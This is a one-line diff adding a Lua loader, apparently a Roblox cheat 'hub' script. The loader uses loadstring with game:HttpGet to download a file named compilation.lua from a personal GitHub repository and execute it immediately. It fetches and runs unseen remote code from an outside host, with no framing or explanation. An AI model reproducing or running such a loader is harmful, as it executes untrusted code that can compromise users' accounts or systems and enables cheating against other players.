@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kietveva/Tkiet-hubv1/main/compilation.lua"))()
